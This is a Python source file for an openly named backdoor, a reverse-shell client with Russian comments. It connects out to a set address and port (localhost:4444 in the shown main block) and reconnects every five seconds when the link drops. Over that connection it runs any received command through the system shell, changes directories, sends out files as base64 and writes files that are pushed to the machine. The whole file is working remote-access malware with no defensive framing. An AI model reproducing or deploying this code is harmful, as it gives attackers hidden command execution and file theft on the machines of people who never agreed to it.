from datetime import datetime
import json
import os
import socket 
import subprocess
import time
from typing import List
import base64


class CloseConnection(Exception): pass

class Backdoor:
    
    def __init__(self, socket: socket.socket):
        self._socket = socket
    
    def __del__(self):
        self.close()
        
    def _send(self, data :bytes):
        json_data = json.dumps(data.decode())
        self._socket.send(json_data.encode())
        
    def _recv(self):
        json_data = b""
        while True:
            try:
                json_data += self._socket.recv(64000)
                return json.loads(json_data)
            except ValueError:
                continue
            
    def _change_working_directory_to(self, path :str) -> bytes:
        try:
            os.chdir(path)
            return b"[+] Changing working directory to: " + path.encode()
        except:
            return b"No correct path to working directory: " + path.encode()
    
    def _execute_system_command(self, command :List[str]) -> bytes:
        """ Выполняет, полученную команду """
        
        try:
            result = subprocess.check_output(" ".join(command), shell=True)
            if not result:
                return b""
            return result
        except:
            return b"Error executing system command"

    def _proccess_command(self, command :List[str]) -> bytes:
        """ Получает и обрабатывает список комманд, и возвращает bytes """
        
        action = command[0]
        if action == "exit":
            self.close()
            raise CloseConnection
        elif action == "cd":
            command_result = self._change_working_directory_to(command[1])
        elif action == "download":
            command_result = BinaryExecutor.read_file(command[1])
        elif action == "upload":
            BinaryExecutor.write_file(command[2], command[3].encode())
            command_result = b"Upload successful --> " + command[2].encode()
        else:
            command_result = self._execute_system_command(command)
        return command_result
    
    def run(self):
        while True:
            try:
                command_list = self._recv()
                command_result = self._proccess_command(command_list)
                self._send(command_result)
            except CloseConnection:
                break
            except Exception as e:
                self._send(b""+str(e).encode())
            
    def close(self):
        if self._socket:
            self._socket.close()
            self._socket = None


class BinaryExecutor:
    """ Класс выполняет бинарные команды """
    
    @staticmethod
    def write_file(path :str = f"./file_{datetime.now()}", data :bytes = b""):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(data))
        
    @staticmethod
    def read_file(path :str) -> bytes:
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

def shedule_connection(ip, port):
    while True:
        try:
            _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _socket.connect((ip, port))
            print("Success connect")
            backdoor = Backdoor(_socket)
            backdoor.run()
        except KeyboardInterrupt:
            _socket.close()
            exit()
        except Exception:
            print("Waiting ...")
            try:
                time.sleep(5)
                print(f"Trying to connect")
            except KeyboardInterrupt:
                exit()
            
            
if __name__ == "__main__":
    shedule_connection("127.0.0.1", 4444)
